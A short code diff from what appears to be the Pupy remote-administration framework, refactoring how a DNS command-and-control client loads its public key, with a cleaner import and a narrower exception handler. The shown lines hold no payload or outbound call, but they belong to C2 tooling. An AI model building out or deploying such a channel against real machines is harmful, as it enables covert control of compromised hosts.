@@ -41,9 +41,9 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         self.new_commands = Event()
 
         try:
-            from pupy_credentials import DNSCNC_PUB_KEY_V2
-            key = DNSCNC_PUB_KEY_V2
-        except:
+            import pupy_credentials
+            key = pupy_credentials.DNSCNC_PUB_KEY_V2
+        except ImportError:
             from pupylib.PupyCredentials import Credentials
             credentials = Credentials()
             key = credentials['DNSCNC_PUB_KEY_V2']
